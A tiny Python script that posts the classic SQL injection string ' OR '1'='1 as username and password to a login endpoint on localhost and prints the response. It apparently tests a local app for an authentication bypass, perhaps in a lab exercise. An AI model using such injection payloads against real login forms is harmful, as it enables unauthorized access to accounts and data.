import requests
r = requests.post('http://127.0.0.1:5001/login', data={'username': "' OR '1'='1", 'password': "' OR '1'='1"})
print('status:', r.status_code)
print('text:', repr(r.text))
